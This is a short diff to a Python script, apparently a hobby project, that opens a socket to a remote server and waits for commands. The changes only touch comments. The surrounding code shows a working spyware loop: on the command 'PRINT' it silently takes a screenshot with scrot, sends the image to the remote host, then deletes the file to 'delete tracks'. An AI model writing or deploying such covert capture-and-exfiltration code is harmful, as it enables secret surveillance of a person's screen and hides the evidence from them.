@@ -3,7 +3,6 @@ import time
 import sys
 import os
 
-
 def handle_prt_sc(destination_address, destination_port):
     path = '/home/michel/pessoal/'
     screenshot = 'screenshot-'
@@ -17,11 +16,12 @@ def handle_prt_sc(destination_address, destination_port):
         sock.connect((destination_address, destination_port))
 
         while True:
+            # RECEIVE MESSAGE FROM SERVER
             data = sock.recv(1024).decode('utf-8')
 
             # TAKE AND SEND PRINT SCREEN
             if data == 'PRINT':
-                # change picture's name
+                # change picture's path
                 final_path = path + screenshot + str(n) + ".jpg"  
                 # take the print screen
                 os.system("scrot " + final_path)
@@ -36,7 +36,7 @@ def handle_prt_sc(destination_address, destination_port):
                 # send a marker to inform that the file its end
                 sock.send(EOF.encode('utf-8'))
                
-                # delete tracks
+                # DELETE TRACKS
                 os.system("rm " + final_path)
                 n += 1
     finally:
